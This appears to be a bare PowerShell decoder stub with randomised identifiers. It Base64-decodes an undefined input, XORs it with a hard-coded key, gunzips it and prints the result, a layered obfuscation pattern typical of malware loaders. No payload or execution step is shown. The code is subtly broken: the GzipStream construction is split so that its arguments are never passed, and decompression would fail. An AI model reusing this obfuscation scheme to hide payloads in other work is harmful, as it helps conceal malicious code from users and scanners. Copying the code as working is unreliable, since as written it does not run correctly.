$jq2y13vf7k96n4c = [System.Text.Encoding]::ascii

function u1lpi5kb86ma7t2synxwj9q3ezh {
    param($js0hfx1m8vl4qgy)
    $6yorbd8xcihuw9q = [System.Convert]::FromBase64String($js0hfx1m8vl4qgy)
    $lvu105oy2g46is9 = $jq2y13vf7k96n4c.GetBytes("g83wljmukoic")
    $imd83zxfgbkah7r = $6yorbd8xcihuw9q
    $w5lg3krfdvmz867 = $(for ($ry0qt2wahxfzl5c = 0; $ry0qt2wahxfzl5c -lt $imd83zxfgbkah7r.length; ) {
        for ($4mo6ja37v9xc5er = 0; $4mo6ja37v9xc5er -lt $lvu105oy2g46is9.length; $4mo6ja37v9xc5er++) {
            $imd83zxfgbkah7r[$ry0qt2wahxfzl5c] -bxor $lvu105oy2g46is9[$4mo6ja37v9xc5er]
            $ry0qt2wahxfzl5c++
            if ($ry0qt2wahxfzl5c -ge $imd83zxfgbkah7r.Length) {
                $4mo6ja37v9xc5er = $lvu105oy2g46is9.length
            }
        }
    })
    $hd26lnj4a5s1x89 = New-Object System.IO.MemoryStream(,$w5lg3krfdvmz867)
    $0nd7v621wf4a93u = New-Object System.IO.MemoryStream
    $miavdhspc4fjk01 = New-Object System.IO.Compression.GzipStream
    $hd26lnj4a5s1x89, ([IO.Compression.CompressionMode]::Decompress)
    $miavdhspc4fjk01.CopyTo($0nd7v621wf4a93u)
    $miavdhspc4fjk01.Close()
    $hd26lnj4a5s1x89.Close()
    [byte[]]$h2ijmzq91kwlupc = $0nd7v621wf4a93u.ToArray()
    $rh2smyuve3co58a = $h2ijmzq91kwlupc
    return $rh2smyuve3co58a
}

[byte[]]$7pgiyfkw0l6q5nx = u1lpi5kb86ma7t2synxwj9q3ezh $flg2snqwu57vtao

[System.Text.Encoding]::ascii.GetString($7pgiyfkw0l6q5nx)